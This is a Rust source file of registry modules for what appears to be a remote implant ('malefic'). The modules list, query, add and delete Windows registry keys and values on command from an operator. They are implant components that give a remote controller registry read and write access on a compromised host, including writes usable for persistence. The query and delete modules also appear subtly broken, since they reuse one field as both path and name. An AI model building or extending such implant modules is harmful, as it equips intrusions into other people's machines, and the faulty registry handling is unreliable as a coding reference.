use crate::{check_field, check_request, Input, Module, Output, Result, TaskResult};
use async_trait::async_trait;
use malefic_helper::to_error;
use malefic_helper::win::reg::{RegistryKey, RegistryValue};
use malefic_proto::proto::implantpb::spite::Body;
use malefic_trait::module_impl;

pub struct RegListKey {}

#[async_trait]
#[module_impl("reg_list_key")]
impl Module for RegListKey {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
        let req = check_request!(receiver, Body::RegistryRequest)?;
        let hive = check_field!(req.hive)?;
        let path = check_field!(req.path)?;

        let reg_key = RegistryKey::open(hive.parse()?, &*path)?;
        let res = reg_key.list_subkeys()?;
        let mut resp = malefic_proto::proto::modulepb::Response::default();
        resp.array = res;
        Ok(TaskResult::new_with_body(id, Body::Response(resp)))
    }
}

pub struct RegListValue {}
#[async_trait]
#[module_impl("reg_list_value")]
impl Module for RegListValue {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
        let req = check_request!(receiver, Body::RegistryRequest)?;
        let hive = check_field!(req.hive)?;
        let path = check_field!(req.path)?;

        let reg_key = RegistryKey::open(hive.parse()?, &*path)?;
        let res = reg_key.list_values()?;

        let mut resp = malefic_proto::proto::modulepb::Response::default();
        for (key, value) in res {
            resp.kv.insert(key, value.to_string());
        }

        Ok(TaskResult::new_with_body(id, Body::Response(resp)))
    }
}

pub struct RegQuery {}
#[async_trait]
#[module_impl("reg_query")]
impl Module for RegQuery {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
        let req = check_request!(receiver, Body::RegistryRequest)?;
        let hive = check_field!(req.hive)?;
        let subkey = check_field!(req.key)?;

        let reg_key = RegistryKey::open(hive.parse()?, &*subkey)?;
        let value = reg_key.query_value(&*subkey)?;

        let mut resp = malefic_proto::proto::modulepb::Response::default();
        resp.output = value.to_string();

        Ok(TaskResult::new_with_body(id, Body::Response(resp)))
    }
}

pub struct RegAdd {}
#[async_trait]
#[module_impl("reg_add")]
impl Module for RegAdd {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
        let req = check_request!(receiver, Body::RegistryWriteRequest)?;
        let hive = check_field!(req.hive)?;
        let path = check_field!(req.path)?;
        let key = check_field!(req.key)?;

        let reg_key = match RegistryKey::open(hive.parse()?, &*path) {
            Ok(key) => key,
            Err(_) => RegistryKey::create(hive.parse()?, &*path)?,
        };

        // 根据 regtype 设置不同类型的值
        match req.regtype {
            1 => {
                // REG_SZ
                let string_value = check_field!(req.string_value)?;
                reg_key.set_value(&*key, RegistryValue::String(string_value))?;
            }
            3 => {
                // REG_BINARY
                let byte_value = check_field!(req.byte_value)?;
                to_error!(reg_key.set_value(&*key, RegistryValue::Binary(byte_value.to_vec())))?;
            }
            4 => {
                // REG_DWORD
                let dword_value = req.dword_value;
                reg_key.set_value(&*key, RegistryValue::Dword(dword_value))?;
            }
            11 => {
                // REG_QWORD
                let qword_value = req.qword_value;
                reg_key.set_value(&*key, RegistryValue::Qword(qword_value))?;
            }
            _ => return Err(anyhow::Error::msg("Unsupported registry value type").into()),
        }

        Ok(TaskResult::new(id))
    }
}

pub struct RegDelete {}

#[async_trait]
#[module_impl("reg_delete")]
impl Module for RegDelete {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
        let req = check_request!(receiver, Body::RegistryRequest)?;
        let hive = check_field!(req.hive)?;
        let subkey = check_field!(req.key)?;

        let reg_key = RegistryKey::open(hive.parse()?, &*subkey)?;
        reg_key.delete_key(Some(&*subkey))?;

        Ok(TaskResult::new(id))
    }
}
